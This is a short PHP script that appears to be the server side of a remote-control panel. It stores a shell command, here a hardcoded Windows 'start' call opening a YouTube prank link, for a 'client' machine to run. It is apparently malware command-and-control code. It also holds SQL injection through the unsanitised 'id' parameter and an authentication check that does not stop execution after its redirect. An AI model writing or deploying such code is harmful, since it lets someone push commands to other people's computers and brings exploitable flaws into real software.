<?php
include ("includes/connect.php");

if (!isset($_SESSION['username'])){
    header('Location: index.php?page=login');
}

if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    $clientid  = $_GET['id'];

    $cmd = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ';

    $sql = "SELECT * FROM clients WHERE clientid = '$clientid' LIMIT 1";
    $query = mysqli_query($connect, $sql);
    $rows = mysqli_num_rows($query);

    if($rows != 0){        
        $sql = "UPDATE clients SET command = '$cmd' WHERE clientid = '$clientid'";
        $query = mysqli_query($connect, $sql);

        echo 'command is updated';
    } else {
        echo 'failed to update command';
    }
}

?>
